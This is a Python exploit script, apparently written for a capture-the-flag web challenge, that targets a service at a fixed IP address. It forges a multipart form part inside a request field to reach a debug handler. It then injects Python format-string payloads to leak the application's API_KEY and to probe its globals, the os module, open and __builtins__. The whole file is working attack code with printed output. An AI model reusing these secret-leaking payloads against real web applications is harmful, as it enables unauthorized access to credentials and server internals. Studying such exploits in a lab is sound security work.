import httpx
import re

TARGET = "http://223.6.249.127:36894"
BOUNDARY = "---------------------------FlagBoundary123"

def get_api_key():
    fmt_payload = "{0.view_functions[action].__globals__[API_KEY]}"
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = fmt_payload + fake_action_part
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=10.0)
    return r.text.strip()

def debug_format(payload):
    fake_action_part = (
        f'\r\n--{BOUNDARY}\r\n'
        f'Content-Disposition: form-data; name="action"; filename="action"\r\n'
        f'Content-Type: text/json\r\n\r\n'
        f'{{"type": "debug"}}\r\n'
    )
    text = payload + fake_action_part
    print(f"[*] Payload length: {len(text)} (max 300)")
    
    params = {'text': text, 'client': 'Content-Type', 'token': f'multipart/form-data; boundary={BOUNDARY}'}
    r = httpx.post(f'{TARGET}/heartbeat', data=params, timeout=15.0)
    return r.text

if __name__ == "__main__":
    api_key = get_api_key()
    print(f"[+] API_KEY: {api_key}")
    
    # Let's check what's available in globals
    print("\n[*] Checking globals keys...")
    result = debug_format("{0.view_functions[action].__globals__.keys()}")
    print(result[:500])
    
    # Try os path join or other methods
    print("\n[*] Checking os module...")
    result = debug_format("{0.view_functions[action].__globals__[os]}")
    print(result[:200])
    
    # Try to use open() function 
    print("\n[*] Try open builtin...")
    result = debug_format("{0.view_functions[action].__globals__[open]}")
    print(result[:200])
    
    # Use glob module if available
    print("\n[*] Try httpx module...")
    result = debug_format("{0.view_functions[action].__globals__[httpx]}")
    print(result[:200])
    
    # Check what __builtins__ has
    print("\n[*] Check __builtins__ type...")
    result = debug_format("{0.view_functions[action].__globals__[__builtins__]}")
    print(result[:300])
